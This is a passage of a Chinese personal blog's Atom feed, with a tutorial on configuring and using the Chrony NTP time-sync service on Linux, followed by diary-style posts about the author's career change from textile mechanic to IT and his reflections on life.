class="number">275</span>us</span><br></pre></td></tr></table></figure></p><p>检查ntp详细同步状态：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@ok188.net ~]#  chronyc sources -v</span><br><span class="line"><span class="number">210</span> Number of sources = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">  .-- Source mode  '^' = server, '=' = peer, '#' = local clock.</span><br><span class="line"> / .- Source <span class="section">state</span> '*' = current synced, '+' = combined , '-' = not combined,</span><br><span class="line">| /   '?' = unreachable, 'x' = time may be in error, '~' = time too variable.</span><br><span class="line">||                                                 .- xxxx [ yyyy ] +/- zzzz</span><br><span class="line">||      Reachability register (octal) -.           |  xxxx = adjusted offset,</span><br><span class="line">||      Log2(Polling interval) --.      |          |  yyyy = measured offset,</span><br><span class="line">||                                \     |          |  zzzz = estimated error.</span><br><span class="line">||                                 |    |           \</span><br><span class="line">MS Name/IP address         Stratum Poll Reach LastRx Last sample</span><br><span class="line">===============================================================================</span><br><span class="line">^+ time6.aliyun.com              <span class="number">2</span>  <span class="number">10</span>   <span class="number">377</span>  <span class="number">1021</span>  +<span class="number">1438</span>us[+<span class="number">1345</span>us] +/-   <span class="number">25</span>ms</span><br><span class="line">^+ time4.aliyun.com              <span class="number">2</span>   <span class="number">9</span>   <span class="number">377</span>     <span class="number">2</span>  +<span class="number">2047</span>us[+<span class="number">2047</span>us] +/-   <span class="number">35</span>ms</span><br><span class="line">^* time5.aliyun.com              <span class="number">2</span>   <span class="number">9</span>   <span class="number">377</span>   <span class="number">506</span>  <span class="number">-1712</span>us[<span class="number">-1851</span>us] +/-   <span class="number">18</span>ms</span><br></pre></td></tr></table></figure></p><h2 id="使用chronyc"><a href="#使用chronyc" class="headerlink" title="使用chronyc"></a>使用chronyc</h2><p>可以通过运行chronyc命令来修改设置，命令如下：</p><ul><li><p>accheck - 检查NTP访问是否对特定主机可用</p></li><li><p>activity - 该命令会显示有多少NTP源在线/离线</p></li><li><p>add server - 手动添加一台新的NTP服务器。</p></li><li><p>clients - 在客户端报告已访问到服务器</p></li><li><p>delete - 手动移除NTP服务器或对等服务器</p></li><li><p>settime - 手动设置守护进程时间</p></li><li><p>tracking - 显示系统时间信息</p></li></ul><p>输入help命令可以查看更多chronyc的交互命令。<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@ok188.net ~]<span class="comment"># chronyc</span></span><br><span class="line">chrony <span class="built_in">version</span> <span class="number">2.1</span><span class="number">.1</span></span><br><span class="line">Copyright (C) <span class="number">1997</span><span class="number">-2003</span>, <span class="number">2007</span>, <span class="number">2009</span><span class="number">-2015</span> Richard P. Curnow <span class="keyword">and</span> others</span><br><span class="line">chrony comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY.  This <span class="keyword">is</span> free software, <span class="keyword">and</span></span><br><span class="line">you are welcome <span class="keyword">to</span> redistribute <span class="keyword">it</span> under certain conditions.  See <span class="keyword">the</span></span><br><span class="line">GNU General Public License <span class="built_in">version</span> <span class="number">2</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">chronyc&gt; activity</span><br><span class="line"><span class="number">200</span> OK</span><br><span class="line"><span class="number">4</span> sources online</span><br><span class="line"><span class="number">0</span> sources offline</span><br><span class="line"><span class="number">0</span> sources doing burst (<span class="literal">return</span> <span class="keyword">to</span> online)</span><br><span class="line"><span class="number">0</span> sources doing burst (<span class="literal">return</span> <span class="keyword">to</span> offline)</span><br><span class="line"><span class="number">1</span> sources <span class="keyword">with</span> unknown address</span><br></pre></td></tr></table></figure></p><h2 id="chrony的优势"><a href="#chrony的优势" class="headerlink" title="chrony的优势"></a>chrony的优势</h2><p>Chrony 的优势包括：</p><ul><li>更快的同步只需要数分钟而非数小时时间，从而最大程度减少了时间和频率误差，这对于并非全天 24 小时运行的台式计算机或系统而言非常有用。</li><li>能够更好地响应时钟频率的快速变化，这对于具备不稳定时钟的虚拟机或导致时钟频率发生变化的节能技术而言非常有用。</li><li>在初始同步后，它不会停止时钟，以防对需要系统时间保持单调的应用程序造成影响。</li><li>在应对临时非对称延迟时（例如，在大规模下载造成链接饱和时）提供了更好的稳定性。</li><li>无需对服务器进行定期轮询，因此具备间歇性网络连接的系统仍然可以快速同步时钟。</li></ul><h2 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h2><p><a href="https://chrony.tuxfamily.org/documentation.html" target="_blank" rel="noopener">https://chrony.tuxfamily.org/documentation.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Linux系统下校时服务Chrony使用&quot;&gt;&lt;a href=&quot;#Linux系统下校时服务Chrony使用&quot; class=&quot;headerlink&quot; title=&quot;Linux系统下校时服务Chrony使用&quot;&gt;&lt;/a&gt;Linux系统下校时服务Chrony使用&lt;/h1&gt;&lt;p&gt;Chrony 应用本身已经有几年了，其是是网络时间协议的 (NTP) 的另一种实现。一直以来众多发行版里标配的都是ntpd对时服务，自rhel7/centos7 起，Chrony做为了发行版里的标配服务，不过老的ntpd服务依旧在rhel7/centos7里可以找到 。Chrony可以同时做为ntp服务的客户端和服务端。默认安装完后有两个程序chronyd和chronyc 。chronyd是一个在系统后台运行的守护进程，chronyc是用来监控chronyd性能和配置其参数程序&lt;/p&gt;
&lt;h2 id=&quot;安装和启用&quot;&gt;&lt;a href=&quot;#安装和启用&quot; class=&quot;headerlink&quot; title=&quot;安装和启用&quot;&gt;&lt;/a&gt;安装和启用&lt;/h2&gt;&lt;figure class=&quot;highlight routeros&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[root@ok188.net ~]# yum install -y chrony&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[root@ok188.net ~]# cat &amp;lt;&amp;lt; EOF &amp;gt; /etc/chrony.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 使用上层的internet ntp服务器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;server time1.aliyun.com iburst&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;server time2.aliyun.com iburst&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;server time3.aliyun.com iburst&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;server time4.aliyun.com iburst&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;server time5.aliyun.com iburst&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;stratumweight 0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;driftfile /var/lib/chrony/drift&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rtcsync&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;makestep 10 3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bindcmdaddress 127.0.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bindcmdaddress ::1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;keyfile /etc/chrony.keys&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;commandkey 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;generatecommandkey&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;noclientlog&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;logchange 0.5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;logdir /var/log/chrony&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[root@ok188.net ~]# systemctl stop ntpd&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[root@ok188.net ~]# systemctl &lt;span class=&quot;builtin-name&quot;&gt;disable&lt;/span&gt; ntpd&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[root@ok188.net ~]# systemctl &lt;span class=&quot;builtin-name&quot;&gt;enable&lt;/span&gt; chronyd.service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[root@ok188.net ~]# systemctl start chronyd.service&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;配置文件解析&quot;&gt;&lt;a href=&quot;#配置文件解析&quot; class=&quot;headerlink&quot; title=&quot;配置文件解析&quot;&gt;&lt;/a&gt;配置文件解析&lt;/h4&gt;&lt;p&gt;如果本局域网内有对时服务开启的话，通过将上面的几条serer记录删除，增加指定局域网内的对时服务器并restart chrony服务即可。其中主要的配置参数有如下几个：&lt;br&gt;
    
    </summary>
    
      <category term="系统运维" scheme="https://linux7788.com/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"/>
    
      <category term="Linux" scheme="https://linux7788.com/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/Linux/"/>
    
    
      <category term="Chrony" scheme="https://linux7788.com/tags/Chrony/"/>
    
  </entry>
  
  <entry>
    <title>毕业这4年-坦然接受，脚踏实地</title>
    <link href="https://linux7788.com/life/life_record_2014-9-4/"/>
    <id>https://linux7788.com/life/life_record_2014-9-4/</id>
    <published>2014-09-04T05:35:25.000Z</published>
    <updated>2018-05-18T14:53:04.781Z</updated>
    
    <content type="html"><![CDATA[<h2 id="毕业4年了，和朋友聊聊天"><a href="#毕业4年了，和朋友聊聊天" class="headerlink" title="毕业4年了，和朋友聊聊天"></a>毕业4年了，和朋友聊聊天</h2><p>发现原来每个人都过的很难。但没有认怂和想放弃的，依旧在努力。但少了初出校园时的迷茫，生活逼迫我们去找一个方向一个出路。毕业这4年我们有了不同的经历，谈不上人生有多大的起伏，但也共同经历了迷茫与困惑，有过恐惧与逃避。一个人在年轻时经历磨难，如能正确视之，冲出黑暗，那就是一个值得敬慕的人。</p><h2 id="毕业4年了，我是读了两年书又干了两年活"><a href="#毕业4年了，我是读了两年书又干了两年活" class="headerlink" title="毕业4年了，我是读了两年书又干了两年活"></a>毕业4年了，我是读了两年书又干了两年活</h2><p>这期间大多一个人在生活，孤独到快与世隔绝了，一切都得靠自己慢慢的领悟，慢慢的从各种不顺中思考与成长。其间很多事情想通了，很多事情又想不通了，但还是就这么过来了。</p><h2 id="奋斗的青春"><a href="#奋斗的青春" class="headerlink" title="奋斗的青春"></a>奋斗的青春</h2><p>2010年毕业来到苏州后又读了两年书，美美的想着以后可以坐电脑面前吃着泡面玩游戏还可以拿工资。后来2012年毕业正式开始工作，通宵的工作时间，深夜了一个人的办公室，一个人的宿舍，孤单到自言自语，但可以坐电脑面前吃泡面也是游戏公司。2012年开始学习linux，2013年复学linux；2014年我依然在学习。从我学习经历来看，虽然我笨了点慢了点，但总算完成了技术的初步积累。</p><h2 id="毕业4年了，在苏州呆了4年"><a href="#毕业4年了，在苏州呆了4年" class="headerlink" title="毕业4年了，在苏州呆了4年"></a>毕业4年了，在苏州呆了4年</h2><p>我不爱苏州，也许会随时离去，但也许会一直坚持。 始终未曾离去，只因那遥远的梦在这里似乎看到了可能。</p><h2 id="毕业4年了，2014年找到了女朋友"><a href="#毕业4年了，2014年找到了女朋友" class="headerlink" title="毕业4年了，2014年找到了女朋友"></a>毕业4年了，2014年找到了女朋友</h2><p>2014年我遇到了你，有了你。从此我心里感受不到是自己一个人在生活，处处想到的是我们。真实的你，给了我最大的感动和支持。多少个日子，我在心底真真的读着你，心牵着你。讲不出多浪漫的词语，谢谢有你！让我慢慢读懂了什么是责任和珍惜。</p><h2 id="毕业4年了，梦想与行动"><a href="#毕业4年了，梦想与行动" class="headerlink" title="毕业4年了，梦想与行动"></a>毕业4年了，梦想与行动</h2><p>我们感受到压力是因为我们不认同现在的自己，不甘心。对自己现在的不认同，是前行的开始。<br>我们永远无法准备好，因为我们很无知。我们无法知道明天会发生什么，事情是变的更糟糕还是变的更好。我们可以计划去开始做一件事，猜想最终的结果，但那毕竟只是猜想。有时你得要承认自己的无力，有时要庆幸自己的幸运。最好的准备便是没有准备，坦然接受、脚踏实地。<br>现在，我可以坦然接受自己不是一个优秀的人，但是我不认同以后依旧如此。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;毕业4年了，和朋友聊聊天&quot;&gt;&lt;a href=&quot;#毕业4年了，和朋友聊聊天&quot; class=&quot;headerlink&quot; title=&quot;毕业4年了，和朋友聊聊天&quot;&gt;&lt;/a&gt;毕业4年了，和朋友聊聊天&lt;/h2&gt;&lt;p&gt;发现原来每个人都过的很难。但没有认怂和想放弃的，依旧在努力。
      
    
    </summary>
    
      <category term="生活记录" scheme="https://linux7788.com/categories/%E7%94%9F%E6%B4%BB%E8%AE%B0%E5%BD%95/"/>
    
      <category term="2014年" scheme="https://linux7788.com/categories/%E7%94%9F%E6%B4%BB%E8%AE%B0%E5%BD%95/2014%E5%B9%B4/"/>
    
    
      <category term="life" scheme="https://linux7788.com/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>毕业这4年-坦然接受，脚踏实地</title>
    <link href="https://linux7788.com/%E7%94%9F%E6%B4%BB%E8%AE%B0%E5%BD%95/2014%E5%B9%B4/life_record_2014-9-4/"/>
    <id>https://linux7788.com/生活记录/2014年/life_record_2014-9-4/</id>
    <published>2014-09-04T05:35:25.000Z</published>
    <updated>2018-05-18T15:32:59.064Z</updated>
    
    <content type="html"><![CDATA[<h2 id="毕业4年了，和朋友聊聊天"><a href="#毕业4年了，和朋友聊聊天" class="headerlink" title="毕业4年了，和朋友聊聊天"></a>毕业4年了，和朋友聊聊天</h2><p>发现原来每个人都过的很难。但没有认怂和想放弃的，依旧在努力。但少了初出校园时的迷茫，生活逼迫我们去找一个方向一个出路。毕业这4年我们有了不同的经历，谈不上人生有多大的起伏，但也共同经历了迷茫与困惑，有过恐惧与逃避。一个人在年轻时经历磨难，如能正确视之，冲出黑暗，那就是一个值得敬慕的人。</p><h2 id="毕业4年了，我是读了两年书又干了两年活"><a href="#毕业4年了，我是读了两年书又干了两年活" class="headerlink" title="毕业4年了，我是读了两年书又干了两年活"></a>毕业4年了，我是读了两年书又干了两年活</h2><p>这期间大多一个人在生活，孤独到快与世隔绝了，一切都得靠自己慢慢的领悟，慢慢的从各种不顺中思考与成长。其间很多事情想通了，很多事情又想不通了，但还是就这么过来了。</p><h2 id="奋斗的青春"><a href="#奋斗的青春" class="headerlink" title="奋斗的青春"></a>奋斗的青春</h2><p>2010年毕业来到苏州后又读了两年书，美美的想着以后可以坐电脑面前吃着泡面玩游戏还可以拿工资。后来2012年毕业正式开始工作，通宵的工作时间，深夜了一个人的办公室，一个人的宿舍，孤单到自言自语，但可以坐电脑面前吃泡面也是游戏公司。2012年开始学习linux，2013年复学linux；2014年我依然在学习。从我学习经历来看，虽然我笨了点慢了点，但总算完成了技术的初步积累。</p><h2 id="毕业4年了，在苏州呆了4年"><a href="#毕业4年了，在苏州呆了4年" class="headerlink" title="毕业4年了，在苏州呆了4年"></a>毕业4年了，在苏州呆了4年</h2><p>我不爱苏州，也许会随时离去，但也许会一直坚持。 始终未曾离去，只因那遥远的梦在这里似乎看到了可能。</p><h2 id="毕业4年了，2014年找到了女朋友"><a href="#毕业4年了，2014年找到了女朋友" class="headerlink" title="毕业4年了，2014年找到了女朋友"></a>毕业4年了，2014年找到了女朋友</h2><p>2014年我遇到了你，有了你。从此我心里感受不到是自己一个人在生活，处处想到的是我们。真实的你，给了我最大的感动和支持。多少个日子，我在心底真真的读着你，心牵着你。讲不出多浪漫的词语，谢谢有你！让我慢慢读懂了什么是责任和珍惜。</p><h2 id="毕业4年了，梦想与行动"><a href="#毕业4年了，梦想与行动" class="headerlink" title="毕业4年了，梦想与行动"></a>毕业4年了，梦想与行动</h2><p>我们感受到压力是因为我们不认同现在的自己，不甘心。对自己现在的不认同，是前行的开始。<br>我们永远无法准备好，因为我们很无知。我们无法知道明天会发生什么，事情是变的更糟糕还是变的更好。我们可以计划去开始做一件事，猜想最终的结果，但那毕竟只是猜想。有时你得要承认自己的无力，有时要庆幸自己的幸运。最好的准备便是没有准备，坦然接受、脚踏实地。<br>现在，我可以坦然接受自己不是一个优秀的人，但是我不认同以后依旧如此。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;毕业4年了，和朋友聊聊天&quot;&gt;&lt;a href=&quot;#毕业4年了，和朋友聊聊天&quot; class=&quot;headerlink&quot; title=&quot;毕业4年了，和朋友聊聊天&quot;&gt;&lt;/a&gt;毕业4年了，和朋友聊聊天&lt;/h2&gt;&lt;p&gt;发现原来每个人都过的很难。但没有认怂和想放弃的，依旧在努力。
      
    
    </summary>
    
      <category term="生活记录" scheme="https://linux7788.com/categories/%E7%94%9F%E6%B4%BB%E8%AE%B0%E5%BD%95/"/>
    
      <category term="2014年" scheme="https://linux7788.com/categories/%E7%94%9F%E6%B4%BB%E8%AE%B0%E5%BD%95/2014%E5%B9%B4/"/>
    
    
      <category term="life" scheme="https://linux7788.com/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>2012年一些日记记录归档</title>
    <link href="https://linux7788.com/%E7%94%9F%E6%B4%BB%E8%AE%B0%E5%BD%95/2012%E5%B9%B4/life_record_2012/"/>
    <id>https://linux7788.com/生活记录/2012年/life_record_2012/</id>
    <published>2012-12-12T05:35:25.000Z</published>
    <updated>2018-05-18T15:32:59.072Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>无意中翻看到了2012年，本科临近毕业时的那段时间相关记录，很有意思。2012年那一年注定是个特殊的年份。现在回想起来发现人生所有经历都是一种财富！</p><p>再次归档整理时间：2018年4月30日</p><h2 id="2012-3-19-22-31"><a href="#2012-3-19-22-31" class="headerlink" title="2012-3-19 22:31"></a>2012-3-19 22:31</h2><h3 id="未来会好的？我好想现在就能看到未来的样子"><a href="#未来会好的？我好想现在就能看到未来的样子" class="headerlink" title="未来会好的？我好想现在就能看到未来的样子"></a>未来会好的？我好想现在就能看到未来的样子</h3><p>专科时开始接触电脑，并慢慢喜欢上电脑了。在帮朋友解决电脑的问题时体验到了少有的成就和自豪。<br>但在专科时学的专业是纺织机电，2010年浑浑噩噩的专科的大学生活就这么结束了。毕业后在一家纺织厂工作，工作后才发现这种生活真心不是自己喜欢和想要的。<br>当时想从事计算机方面的工作，可在寻找工作时发现自己会的只是一些电脑操作的技巧和一张计算机等级二级vb证书，当时想过培训，又怕培训不靠谱。<br>于是参加了一所大学的自考助学（脱产的那种）学习。在自考的同时考取了ccna，今年5月份打算参加软考（网络工程师）。<br>今年7月份所有自考课程就结束了，又要开始重新找工作了。方向定在网络方面。<br>现突然发现自己对电脑的热情不如之前那么浓烈了，归于平淡。考虑更多的是工作和以后的生活还有的是从事计算机那个方向更挣钱。<br>小时有个玩伴初中毕业后在亲戚的带领下去了一家移动电信公司工作，进行室外布线和线路维护。过年回家时听他讲过他的工作但没见过，但人胖了好多，他现在也是我们村在外面打工混的比较好的一个，我叔叔家有个弟弟今年初中毕业后没工作今年也和他去了，看样子工作技术难度或者要求不是太高。我问过弟弟，他说工作时间不固定更多的是电信线路的抢修维护。但他们工资都挺高的，没面试直接上岗一个月也5千左右。<br>对，眼光得放远了看，试着用一些大道理一遍一遍的稳住自己：坚持就是顺利、学历不重要能力更重要、奋斗终会成功的、不浮躁、从基层做起一步一步来。。。。。。。。<br>可有时夜晚还是会经常的习惯性失眠。</p><h2 id="2012-4-27-22-30"><a href="#2012-4-27-22-30" class="headerlink" title="2012-4-27 22:30"></a>2012-4-27 22:30</h2><h3 id="面试归来，一塌糊涂"><a href="#面试归来，一塌糊涂" class="headerlink" title="面试归来，一塌糊涂"></a>面试归来，一塌糊涂</h3><p>今天去面试了，面试职位是网络监控。由于紧张回答问题时语无伦次，表现的好差。很多东西都可以回答出来的看由于当时紧张全忘了。估计这次没戏了。<br>再多的面试技巧，没有扎实的技术基础也是没用的。第一轮面试时问的全是技术问题，到第二轮才问一些职业规划类的问题。</p><p>以前我总是抱怨学校学的知识不实用全理论，指望着到社会上找一家好的公司实习积累点实际经验，抱着以学习的态度寻找公司。<br>可我也同时忘了公司不再是学校，公司需要你为她创造价值，需要你为她做事，而不是需要一个学生来学习参观。</p><h2 id="2012-5-13-20-09"><a href="#2012-5-13-20-09" class="headerlink" title="2012-5-13 20:09"></a>2012-5-13 20:09</h2><h3 id="一个纺织工人的IT之路"><a href="#一个纺织工人的IT之路" class="headerlink" title="一个纺织工人的IT之路"></a>一个纺织工人的IT之路</h3><p>本人2007年上专科时才开始接触电脑，专科时学的是纺织一类的专业。<br>2008年有了自己的第一台笔记本电脑，开始学着自己装操作系统，学着拆装电脑除尘，帮同学解决电脑问题，遇到的一些电脑问题有时我也不会，但我喜欢去百度、google搜索。<br>慢慢的成了班上同学眼中的电脑高手。<br>2010专科毕业后进入一家纺织厂工作过，修理纺织机器，环境很差，第一个月工资1k，两班制12小时，没有星期天，当时内心深处羡慕着那些搞IT的人至少工作环境不会那么差。</p><p>开始思考自己的人生，不想就这样下去。无意中在网上看到了马云、李开复、俞敏洪、史玉柱等一些大佬们的故事和演讲视频。被深深触动。后决心辞职 要做自己喜欢的工作。<br>2010年9月份参加了一所大学的脱产自考助学软件工程的学习，才发现IT有好多方向。<br>期间参加学校CCNA培训，并于2011年10月份通过认证考试。现正在准备软考，一、为了以考促学，二、想通过多考几个证增加就业机会。<br>想过搞开发，可发现自己根本没有什么项目经验，直至现在自己只修改过一些代码，自己根本没有敲打编写出过一款软件出来。于是想专攻网络方向，习惯了逛51cto论坛开始寻找资料，习惯了每天泡图书馆。<br>但同时在论坛中也看到了太多的前辈们对自己的工作以及待遇的抱怨，自己也时不时的在怀疑，在迷茫。<br>今年5月1号以前的专科同学相聚，专科时的那些同学现大多还是在从事着纺织机修的工作，不过工资也从一开始的1k涨到了3.5k。他们聊的依然是自己的工作环境如何差，工资低，同时表示如何如何羡慕着我的以后工作。才发现这个社会每个人都在抱怨着，想改变。过着被别人羡慕的生活，却同时羡慕着别人过的生活。<br>有时与其抱怨不如实际行动，改变自己更容易些。</p><h2 id="2012-9-16-01-40"><a href="#2012-9-16-01-40" class="headerlink" title="2012-9-16 01:40"></a>2012-9-16 01:40</h2><h3 id="乱七八糟、随便写写"><a href="#乱七八糟、随便写写" class="headerlink" title="乱七八糟、随便写写"></a>乱七八糟、随便写写</h3><p>工作了你才能真正的去发现需要学习什么样的技能。目标定位网络系统运维。学网络首先得学TCP/IP网络协议，TCP/IP协议是在Unix上开发出来的，所以想学好网络就得学好Linux，想学好Linux最少的得会用shell、perl等编写脚本吧，会写脚本C是基础啊。计算机端口得清楚吧、常见的网络攻击方式、一些黑客工具得清楚吧。云计算、虚拟化得有所了解吧，想做好运维工作，数据结构得了解、SQL语句得熟练运用吧，CDN得懂吧。常见监控软件Nagios、Cacti、Zabbix等得会用吧，网络数据抓包、网络协议分析sniffer得会吧。好多路由交换协议都是思科搞出来的，努力准备去考个CCIE。英语是一切基础的基础啊。。。。。。。。。该行动了，不能停留在原地徘徊，资料教程是下载了不少，却没有以前的那么心定认真看完过。年龄也大了，却还单着，害怕一个人以后永远一个人。与电脑呆久了发现电脑更亲切人更陌生了。有时担心未来能否过上自己现在想象中的生活？可现在的生活总得有现在的生活状态吧。锻炼身体。</p><h2 id="2010-11-8-20-14"><a href="#2010-11-8-20-14" class="headerlink" title="2010-11-8 20:14"></a>2010-11-8 20:14</h2><h3 id="灵魂与肉身"><a href="#灵魂与肉身" class="headerlink" title="灵魂与肉身"></a>灵魂与肉身</h3><p>我是谁？我为何会思考？如果我现死去我的灵魂是否还会以另一种方式存在！我是我吗？如何证明我是真实存在的！我周围的一切都是真的吗？说不定我现看到的和我感受到的只是某种生物虚幻给我的？也有可能我现活在别人或自己的梦中？</p><p>肉身和灵魂是分开的吗？灵魂是独立于肉身存在的吗？</p><p>如果我们相信肉体和灵魂是分开独立的，那好我们肉身死后灵魂呢？是否还会存在以另一种方式？或投胎重新做人或其他动物什么的？那假如你投胎成为了一头猪可你这时仍保留人的思维和意识。有这种可能性吗？好比把你的灵魂放进了猪的身体里或其他人的体内。因为肉身和灵魂是分开的吗！那么你的灵魂放还进去后还会具有本来那个肉身所具有的思维和意识吗？</p><p>如果我们相信灵魂是独立于肉身存在的，那么我们可以认为灵魂在我们这个肉身没有出现之前就已经存在了？这种存在有可能性吗？如果有那这个灵魂以什么样的形式存在着呢？我现在的这个肉身是不是我的灵魂想象出来的呢？</p><p>如果一个人意志同我一样，智力与我相同，那么我们便是同一个“我”吗？<br>我们可以以各种规定性来定义自我，只是我想知道有怎样的规定性。<br>我们照镜子，拍相片，不停地做心理测试，其实都是想以外在的角度来审视“我”是谁。<br>“每个人都是一个宇宙”，我必须相信，以便可以维系自我的意义并生存下去。</p><p>如果把自我认为是物质的，那么身体不停变化，那么我也早已就不是我?如果把自我认为是连续的意识和感觉，那么当我们睡着觉以后，也就没有了意识没有了感觉，那当第二天到来，又一个新的连续的意识和感觉就又出现了，我也已经就不是我了?</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;无意中翻看到了2012年，本科临近毕业时的那段时间相关记录，很有意思。2012年那一年注定是个特殊的年份。现在回想起来发现人生所有经历都是一
      
    
    </summary>
    
      <category term="生活记录" scheme="https://linux7788.com/categories/%E7%94%9F%E6%B4%BB%E8%AE%B0%E5%BD%95/"/>
    
      <category term="2012年" scheme="https://linux7788.com/categories/%E7%94%9F%E6%B4%BB%E8%AE%B0%E5%BD%95/2012%E5%B9%B4/"/>
    
    
      <category term="life" scheme="https://linux7788.com/tags/life/"/>
    
  </entry>
  
</feed>
